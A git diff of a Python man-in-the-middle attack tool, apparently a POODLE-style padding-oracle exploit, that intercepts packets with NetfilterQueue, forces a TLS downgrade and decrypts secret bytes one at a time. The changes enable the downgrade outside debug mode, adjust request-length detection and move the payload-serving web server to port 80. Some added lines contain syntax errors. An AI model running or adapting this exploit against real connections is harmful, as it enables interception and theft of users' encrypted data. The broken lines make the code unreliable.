@@ -26,7 +26,7 @@ class Session:
 		
 # Need to get the server IP from DNS response
 server_ip = None
-server_ip = '108.188.248.81' # temp
+server_ip = '108.188.248.132' # temp
 
 # For block_size stage
 ciphertext_length = 0
@@ -34,13 +34,14 @@ data_padding_size_needed = 0
 block_size = None
 
 # For exploit stage
-block_to_move = 60 
+block_to_move = 0 
 current_offset = 0
 secret = {}
 count = 0
 number_of_requests = {}
 
 dns_mapping = {}
+request_length_count = {}
 option_request_length = None
 post_request_length = None
 option_response_length = None
@@ -83,30 +84,32 @@ with output(output_type='list', initial_len=6) as output_list:
 		return 0
 
 	def print_state(ciphertext_length = None, math_str = None):
-		update_state_progress()
+		if not DEBUG:
+			update_state_progress()
 
-		output_list[2] = "Last Byte Decrypted: {}".format(math_str) if math_str is not None else ''
+			output_list[2] = "Last Byte Decrypted: {}".format(math_str) if math_str is not None else ''
 
-		plaintext = repr(''.join([ chr(secret[i]) if i in secret else '.' for i in range(ciphertext_length) ])) if ciphertext_length is not None else '......'
-		output_list[3] = "Decrypted Plaintext: {}".format(plaintext)
-		
-		percent_complete = len(secret) / ciphertext_length if ciphertext_length is not None else 0
-		segment = int(percent_complete * 50)
-		progress_bar = ("#" * segment) + (" " * (50-segment))
-		output_list[4] = "Progress: [{}] {}%".format(progress_bar, int(percent_complete*100))
+			plaintext = repr(''.join([ chr(secret[i]) if i in secret else '.' for i in range(ciphertext_length) ])) if ciphertext_length is not None else '......'
+			output_list[3] = "Decrypted Plaintext: {}".format(plaintext)
+			
+			percent_complete = len(secret) / ciphertext_length if ciphertext_length is not None else 0
+			segment = int(percent_complete * 50)
+			progress_bar = ("#" * segment) + (" " * (50-segment))
+			output_list[4] = "Progress: [{}] {}%".format(progress_bar, int(percent_complete*100))
 
-		if len(number_of_requests) > 0:
-			output_list[5] = "Average number of requests: {}".format(sum(number_of_requests.values()) / len(number_of_requests))
-		else:
-			output_list[5] = "Average number of requests: N/A"
+			if len(number_of_requests) > 0:
+				output_list[5] = "Average number of requests: {}".format(sum(number_of_requests.values()) / len(number_of_requests))
+			else:
+				output_list[5] = "Average number of requests: N/A"
 
 	def update_state_progress():
-		output_list[0] = "Block Size: {}, POST Request length: {}".format(block_size, post_request_length) + (", OPTION Request length: {}".format(option_request_length) if config["skipOptions"] else "")
-		current_index = get_current_index()
-		try:
-			output_list[1] = "Working on decrypting byte {} - Request #{}".format(current_index, number_of_requests[current_index])
-		except:
-			pass
+		if not DEBUG:
+			output_list[0] = "Block Size: {}, POST Request length: {}".format(block_size, post_request_length) + (", OPTION Request length: {}".format(option_request_length) if config["skipOptions"] else "")
+			current_index = get_current_index()
+			try:
+				output_list[1] = "Working on decrypting byte {} - Request #{}".format(current_index, number_of_requests[current_index])
+			except:
+				pass
 		
 		
 	def callback(packet):
@@ -123,6 +126,7 @@ with output(output_type='list', initial_len=6) as output_list:
 		global dns_mapping
 		global server_ip
 		global number_of_requests
+		global request_length_count
 
 		pkt = IP(packet.get_payload())
 
@@ -181,7 +185,7 @@ with output(output_type='list', initial_len=6) as output_list:
 					packet.accept()
 				return
 
-		if DEBUG and pkt.src == config['target'] and pkt.dst == server_ip and pkt.haslayer(TLS):
+		if pkt.src == config['target'] and pkt.dst == server_ip and pkt.haslayer(TLS):
 			log("TLS Type: {}".format(get_field(pkt.getlayer(TLS), 'type')))
 
 			# TLS Downgrade
@@ -216,7 +220,7 @@ with output(output_type='list', initial_len=6) as output_list:
 			if TLS in pkt and get_field(pkt.getlayer(TLS), 'type') == "application_data":
 
 				# Don't modify pre-flight check
-				if config["skipOptions"] and option_request_length is None or (post_request_length is not None and len(pkt) < post_request_length):
+				if config["skipOptions"] and (option_request_length is None or (post_request_length is not None and len(pkt) < post_request_length)):
 					log("Skipping OPTION Request")
 					if option_request_length is None:
 						log("OPTION Request Length: " + str(len(pkt)))
@@ -225,7 +229,11 @@ with output(output_type='list', initial_len=6) as output_list:
 					return
 				elif post_request_length is None:
 					log("POST Request Length: " + str(len(pkt)))
-					post_request_length = len(pkt)
+					request_length_count[len(pkt)] = request_length_count[len(pkt]) + 1 if len(pkt) in request_length_count else 0
+					if request_length_count[len(pkt)] > 10:
+						post_request_length = len(pkt)
+					else
+						return
 
 				# Stage 1: The JS client is sending packets of increasing length
 				if block_size is None:
@@ -273,7 +281,7 @@ with output(output_type='list', initial_len=6) as output_list:
 					return
 
 				# Ignore response to pre-flight check
-				if config["skipOptions"] and option_response_length is None or len(pkt) == option_response_length:
+				if config["skipOptions"] and (option_response_length is None or len(pkt) == option_response_length):
 					log("Skipping OPTION Response")
 					if option_response_length is None:
 						log("OPTION Response length: " + str(len(pkt)))
@@ -373,7 +381,7 @@ with output(output_type='list', initial_len=6) as output_list:
 	class ThreadingSimpleServer(ThreadingMixIn, HTTPServer):
 		pass
 
-	web_server = ThreadingSimpleServer(('0.0.0.0', 8080), Handler)
+	web_server = ThreadingSimpleServer(('0.0.0.0', 80), Handler)
 	web_server_thread = threading.Thread(target=web_server.serve_forever)
 
 	nfqueue = NetfilterQueue()
